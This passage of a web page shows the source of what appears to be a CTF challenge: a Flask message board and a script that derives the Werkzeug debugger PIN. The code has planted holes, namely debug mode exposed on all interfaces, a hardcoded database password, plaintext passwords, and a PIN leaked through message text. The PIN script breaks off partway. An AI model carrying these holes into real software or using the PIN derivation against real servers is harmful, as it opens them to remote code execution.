        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>
    <span class="token builtin">id</span> <span class="token operator">=</span> dataSql<span class="token punctuation">.</span>usersName<span class="token punctuation">(</span><span class="token punctuation">)</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>
    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
    power <span class="token operator">=</span> <span class="token string">'guest'</span>
    <span class="token keyword">if</span> dataSql<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> power<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
    register successfully
    &lt;br>
    &lt;a href='login'>login now&lt;/a>
    '''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">'username already exists'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
    you are not logged in
    &lt;br>
    &lt;a href='login'>login now&lt;/a>
    '''</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
            msg <span class="token operator">=</span> getMsgList<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'power'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'guest'</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> msg<span class="token punctuation">:</span>
                    <span class="token comment"># remove the message send by other user on private condition</span>
                    <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                        msg<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            message <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span>
            username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>
            nowtime <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">'private'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>
                private <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                private <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">if</span> message <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("invalid input");window.location.href="/index";&lt;/script>'''</span>
            dataSql<span class="token punctuation">.</span>uploadMessage<span class="token punctuation">(</span>username<span class="token punctuation">,</span> message<span class="token punctuation">,</span> nowtime<span class="token punctuation">,</span> private<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("upload successfully");window.location.href="/index";&lt;/script>'''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/delete'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        psg <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'psg'</span><span class="token punctuation">)</span>
        msg <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>dataSql<span class="token punctuation">.</span>showMessage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            h1 <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
            h1<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            h2 <span class="token operator">=</span> h1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token keyword">or</span> session<span class="token punctuation">[</span><span class="token string">'power'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'root'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> h2 <span class="token operator">==</span> psg<span class="token punctuation">:</span>
                dataSql<span class="token punctuation">.</span>deleteMessage<span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("Permission denied");window.location.href="/index";&lt;/script>'''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("login first");window.location.href="/index";&lt;/script>'''</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index/api/getMessage'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> password <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'failed'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'invalid input'</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token keyword">not</span> dataSql<span class="token punctuation">.</span>canLogin<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'failed'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'username or password incorrect'</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">elif</span><span class="token punctuation">(</span>dataSql<span class="token punctuation">.</span>canLogin<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        msg <span class="token operator">=</span> getMsgList<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> dataSql<span class="token punctuation">.</span>getPower<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'guest'</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> msg<span class="token punctuation">:</span>
                <span class="token comment"># remove the message send by other user on private condition</span>
                <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">and</span> username <span class="token operator">!=</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                    msg<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">return</span> msg


<span class="token keyword">def</span> <span class="token function">getMsgList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    msg <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>dataSql<span class="token punctuation">.</span>showMessage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        h1 <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
        h1<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        msg<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token punctuation">[</span>h1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> msg


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span>
</code></pre>

<p><strong>datasql.py</strong></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql
<span class="token keyword">import</span> time
<span class="token keyword">import</span> getPIN

pin <span class="token operator">=</span> getPIN<span class="token punctuation">.</span>get_pin<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Database</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>max_retries <span class="token operator">=</span> max_retries
        self<span class="token punctuation">.</span>db <span class="token operator">=</span> <span class="token boolean">None</span>

    <span class="token keyword">def</span> <span class="token function">__enter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>db <span class="token operator">=</span> self<span class="token punctuation">.</span>connect_to_database<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>db<span class="token punctuation">,</span> self<span class="token punctuation">.</span>db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__exit__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> exc_type<span class="token punctuation">,</span> exc_val<span class="token punctuation">,</span> exc_tb<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>db <span class="token keyword">and</span> self<span class="token punctuation">.</span>db<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>db<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">connect_to_database</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        retries <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">while</span> retries <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>max_retries<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>
                    host<span class="token operator">=</span><span class="token string">"mysql"</span><span class="token punctuation">,</span>  <span class="token comment"># 数据库地址</span>
                    port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>  <span class="token comment"># 数据库端口</span>
                    user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span>  <span class="token comment"># 数据库用户名</span>
                    passwd<span class="token operator">=</span><span class="token string">"The_P0sswOrD_Y0u_Nev3r_Kn0w"</span><span class="token punctuation">,</span>  <span class="token comment"># 数据库密码</span>
                    database<span class="token operator">=</span><span class="token string">"messageboard"</span><span class="token punctuation">,</span>  <span class="token comment"># 数据库名</span>
                    charset<span class="token operator">=</span><span class="token string">'utf8'</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">return</span> db
            <span class="token keyword">except</span> pymysql<span class="token punctuation">.</span>Error <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                retries <span class="token operator">+=</span> <span class="token number">1</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connection attempt </span><span class="token interpolation"><span class="token punctuation">&#123;</span>retries<span class="token punctuation">&#125;</span></span><span class="token string"> failed. Retrying in 5 seconds..."</span></span><span class="token punctuation">)</span>
                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Failed to connect to the database after maximum retries."</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">canLogin</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select password from users where username=%s'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">:</span>
            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select username from users where username=%s'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            sql <span class="token operator">=</span> <span class="token string">'insert into users (id,username,password,power) values (%s,%s,%s,%s)'</span>
            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">)</span>
            db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">changePassword</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>oldPassword<span class="token punctuation">,</span>newPassword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select password from users where username=%s'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">:</span>
            <span class="token keyword">if</span> oldPassword <span class="token operator">==</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                sql <span class="token operator">=</span> <span class="token string">'update users set password=%s where username=%s'</span>
                cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span>newPassword<span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>
                db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">"wrong password"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"username doesn't exist."</span>

<span class="token keyword">def</span> <span class="token function">uploadMessage</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>message<span class="token punctuation">,</span>nowtime<span class="token punctuation">,</span>private<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'insert into message (username,data,time,private) values (%s,%s,%s,%s)'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span>message<span class="token punctuation">,</span>nowtime<span class="token punctuation">,</span>private<span class="token punctuation">)</span><span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">showMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select * from message'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'128-243-397'</span><span class="token punctuation">,</span> pin<span class="token punctuation">)</span> <span class="token keyword">for</span> elem <span class="token keyword">in</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">]</span>
        <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">usersName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select * from users'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getPower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'select power from users where username=%s'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> username<span class="token punctuation">)</span>
        res <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">deleteMessage</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>pubTime<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token punctuation">(</span>db<span class="token punctuation">,</span> cursor<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sql <span class="token operator">=</span> <span class="token string">'delete from message where username=%s and time=%s'</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>pubTime<span class="token punctuation">)</span><span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span></code></pre>

<p><strong>getPIN.py</strong></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
<span class="token keyword">import</span> uuid
<span class="token keyword">def</span> <span class="token function">get_pin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">'root'</span><span class="token comment"># username  /proc/self/environ</span>
        <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># modname</span>
        <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
        <span class="token string">'/usr/local/lib/python3.9/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),</span>
    <span class="token punctuation">]</span>
    uuid1 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    linux <span class="token operator">=</span> <span class="token string">b""</span>

        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>
    <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> value<span class="token punctuation">:</span>
            linux <span class="token operator">+=</span> value
            <span class="token keyword">break</span>

    <span class="token comment"># Containers share the same machine id, add some cgroup</span>
    <span class="token comment"># information. This is used outside containers too but should be</span>
    <span class="token comment"># relatively stable across boots.</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
